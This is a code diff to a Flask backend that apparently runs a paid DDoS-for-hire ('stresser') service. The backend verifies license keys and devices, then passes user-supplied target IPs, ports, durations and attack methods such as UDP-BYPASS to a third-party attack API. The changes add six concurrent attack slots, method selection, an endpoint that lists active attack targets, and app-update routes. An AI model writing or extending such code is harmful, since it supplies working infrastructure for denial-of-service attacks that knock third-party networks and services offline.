@@ -1,4 +1,4 @@
-from flask import Flask, request, jsonify
+from flask import Flask, request, jsonify, send_file
 from flask_cors import CORS
 import requests
 import time
@@ -52,22 +52,14 @@ except Exception as e:
     log(f"❌ MongoDB connection failed: {e}", "ERROR")
     exit(1)
 
-# ========== START TELEGRAM BOT IN BACKGROUND ==========
-def run_telegram_bot():
-    """Run telegram_bot.py"""
+# Start Telegram bot
+try:
     import subprocess
     import sys
-    while True:
-        try:
-            log("🤖 Starting Telegram Bot...")
-            subprocess.run([sys.executable, 'telegram_bot.py'], check=True)
-        except Exception as e:
-            log(f"❌ Telegram Bot crashed: {e}. Restarting in 5 seconds...", "ERROR")
-            time.sleep(5)
-
-bot_thread = threading.Thread(target=run_telegram_bot, daemon=True)
-bot_thread.start()
-log("✅ Telegram Bot thread started")
+    subprocess.Popen([sys.executable, "telegram_bot.py"], cwd=os.path.dirname(os.path.abspath(__file__)))
+    log("✅ Started telegram_bot.py in background")
+except Exception as e:
+    log(f"❌ Failed to start telegram_bot.py: {e}", "ERROR")
 
 # ========== SETTINGS MANAGEMENT ==========
 MIN_ATTACK_TIME = 1
@@ -85,7 +77,7 @@ def get_max_duration():
     return get_setting("max_duration", 300)
 
 def get_cooldown_seconds():
-    return 40
+    return 300
 
 # ========== SERVER IP ==========
 def get_server_ip():
@@ -128,7 +120,7 @@ def verify_key(key, device_id):
         
         if device_id not in current_devices:
             if active_count >= device_limit:
-                return {"valid": False, "reason": f"Device limit reached ({device_limit})"}
+                return {"valid": False, "reason": "Key already set on another device"}
         
         if not session:
             active_sessions_collection.insert_one({
@@ -187,28 +179,31 @@ def set_cooldown(device_id):
 def check_active_attack(device_id):
     try:
         with active_attacks_lock:
-            if device_id in active_attacks:
-                expiry = active_attacks[device_id]
-                if isinstance(expiry, (int, float)) and expiry > time.time():
-                    return {"can_attack": False}
-                elif not isinstance(expiry, (int, float)):
-                    del active_attacks[device_id]
+            now = time.time()
+            active_count = sum(1 for data in active_attacks.values() if isinstance(data, dict) and data.get("expiry", 0) > now)
+            if active_count >= 6:
+                return {"can_attack": False}
         return {"can_attack": True}
     except Exception as e:
         log(f"⚠️ check_active_attack error: {e}", "WARNING")
         return {"can_attack": True}
 
-def start_attack(device_id, duration):
+def start_attack(device_id, duration, ip, port):
     try:
+        attack_id = f"{device_id}_{int(time.time()*1000)}"
         with active_attacks_lock:
-            active_attacks[device_id] = time.time() + duration
+            active_attacks[attack_id] = {
+                "expiry": time.time() + duration,
+                "ip": ip,
+                "port": port
+            }
         
         def cleanup():
             try:
                 time.sleep(duration)
                 with active_attacks_lock:
-                    if device_id in active_attacks:
-                        del active_attacks[device_id]
+                    if attack_id in active_attacks:
+                        del active_attacks[attack_id]
             except Exception as e:
                 log(f"⚠️ cleanup error: {e}", "WARNING")
         
@@ -232,10 +227,10 @@ def cleanup_memory():
                     cleaned_count += 1
             
             with active_attacks_lock:
-                expired_attacks = [did for did, expiry in active_attacks.items()
-                                  if isinstance(expiry, (int, float)) and expiry <= now]
-                for did in expired_attacks:
-                    del active_attacks[did]
+                expired_attacks = [aid for aid, data in active_attacks.items()
+                                  if isinstance(data, dict) and data.get("expiry", 0) <= now]
+                for aid in expired_attacks:
+                    del active_attacks[aid]
                     cleaned_count += 1
             
             if cleaned_count > 0:
@@ -273,6 +268,22 @@ def home():
             "/health"
         ]
     }), 200
+
+@app.route('/login')
+def login_page():
+    return send_file('login.html')
+
+@app.route('/dashboard')
+def dashboard_page():
+    return send_file('dashboard.html')
+
+@app.route('/floating')
+def floating_page():
+    return send_file('floating.html')
+
+@app.route('/logo.png')
+def logo_image():
+    return send_file('logo.png')
 
 @app.route('/health')
 def health():
@@ -312,9 +323,10 @@ def attack_endpoint():
         ip = data.get('ip')
         port = data.get('port')
         duration = data.get('duration')
+        method = data.get('method', 'UDP-BYPASS')
         
         device_id_short = device_id[:8] if device_id else "unknown"
-        log(f"🔵 Attack - Device: {device_id_short}... | Target: {ip}:{port} | Duration: {duration}s")
+        log(f"🔵 Attack - Device: {device_id_short}... | Target: {ip}:{port} | Duration: {duration}s | Method: {method}")
         
         if not all([key, device_id, ip, port, duration]):
             return jsonify({"success": False, "reason": "Missing parameters"}), 400
@@ -349,10 +361,10 @@ def attack_endpoint():
             log(f"❌ Key verification failed: {key_result['reason']}")
             return jsonify({"success": False, "reason": key_result["reason"]}), 401
         
-        # Check active attack
+        # Check active slots (Max 6)
         if not check_active_attack(device_id)["can_attack"]:
-            log(f"❌ Active attack already running")
-            return jsonify({"success": False, "reason": "You already have an attack running"}), 429
+            log(f"❌ Slots full (6/6)")
+            return jsonify({"success": False, "reason": "All attack slots are full. Please wait."}), 429
         
         # Check cooldown
         cooldown_check = check_cooldown(device_id)
@@ -362,16 +374,14 @@ def attack_endpoint():
             return jsonify({"success": False, "reason": f"Cooldown: Wait {remaining} seconds"}), 429
         
         try:
-            # Call RetroStress API
             url = RETROSTRESS_API_URL
             
-            # Check if URL is a template with placeholders
             if "[target]" in url or "[port]" in url or "[time]" in url:
                 log("ℹ️ URL appears to be a template. Replacing placeholders.")
                 url = url.replace("[target]", ip)\
                          .replace("[port]", str(port))\
                          .replace("[time]", str(duration))\
-                         .replace("[method]", "COAP")
+                         .replace("[method]", method)
                 
                 if "key=0" in url and RETROSTRESS_API_KEY:
                     url = url.replace("key=0", f"key={RETROSTRESS_API_KEY}")
@@ -379,13 +389,12 @@ def attack_endpoint():
                 log(f"🔵 Calling RetroStress API: {url}")
                 response = requests.get(url, timeout=30)
             else:
-                # Fallback to standard params if no placeholders
                 params = {
                     "key": RETROSTRESS_API_KEY,
-                    "host": ip, # Use host instead of target as indicated by template
+                    "host": ip,
                     "port": port,
                     "time": duration,
-                    "method": "COAP",
+                    "method": method,
                     "concurrent": 1
                 }
                 log(f"🔵 Calling RetroStress API: {RETROSTRESS_API_URL} with params")
@@ -393,7 +402,7 @@ def attack_endpoint():
             elapsed = time.time() - start_time
             
             if response.status_code == 200 or response.status_code == 201:
-                start_attack(device_id, duration)
+                start_attack(device_id, duration, ip, port)
                 set_cooldown(device_id)
                 log(f"✅ Attack SUCCESS | Time: {elapsed:.2f}s")
                 return jsonify({
@@ -450,7 +459,6 @@ def logout_endpoint():
 
 @app.route('/api/settings', methods=['GET'])
 def get_settings_endpoint():
-    """Endpoint for APK to get attack settings"""
     return jsonify({
         "min_attack": MIN_ATTACK_TIME,
         "max_attack": get_max_duration(),
@@ -459,13 +467,30 @@ def get_settings_endpoint():
 
 @app.route('/api/rules', methods=['GET'])
 def rules_endpoint():
-    """Endpoint for APK to get attack rules"""
     return jsonify({
         "min_attack": MIN_ATTACK_TIME,
         "max_attack": get_max_duration(),
         "cooldown": get_cooldown_seconds(),
         "status": "online"
     })
+
+@app.route('/api/check-update', methods=['GET'])
+def check_update_endpoint():
+    try:
+        version_setting = settings_collection.find_one({"setting_key": "latest_version"})
+        url_setting = settings_collection.find_one({"setting_key": "apk_download_url"})
+        
+        latest_version = version_setting.get("setting_value", "1.0") if version_setting else "1.0"
+        download_url = url_setting.get("setting_value", "/static/app-release.apk") if url_setting else "/static/app-release.apk"
+        
+        return jsonify({
+            "success": True,
+            "latest_version": latest_version,
+            "download_url": download_url
+        })
+    except Exception as e:
+        log(f"❌ Check update error: {e}", "ERROR")
+        return jsonify({"success": False, "reason": str(e)}), 500
 
 @app.route('/api/ip', methods=['GET'])
 def get_ip_endpoint():
@@ -476,9 +501,28 @@ def get_ip_endpoint():
         "timestamp": int(time.time())
     })
 
-# ========== START SERVER (when run directly) ==========
+@app.route('/api/active-attacks', methods=['GET'])
+def get_active_attacks():
+    try:
+        with active_attacks_lock:
+            now = time.time()
+            attacks = []
+            for aid, data in active_attacks.items():
+                if isinstance(data, dict):
+                    expiry = data.get("expiry", 0)
+                    if expiry > now:
+                        attacks.append({
+                            "ip": data.get("ip"),
+                            "port": data.get("port"),
+                            "remaining": int(expiry - now)
+                        })
+            return jsonify({"success": True, "attacks": attacks})
+    except Exception as e:
+        log(f"❌ get_active_attacks error: {e}", "ERROR")
+        return jsonify({"success": False, "reason": str(e)}), 500
+
 if __name__ == '__main__':
-    port = int(os.environ.get('PORT', 8080))
+    port = int(os.environ.get('PORT', 8081))
     server_ip = get_server_ip()
     print("=" * 60)
     print("⚡ RETROSTRESS API SERVER STARTING...")
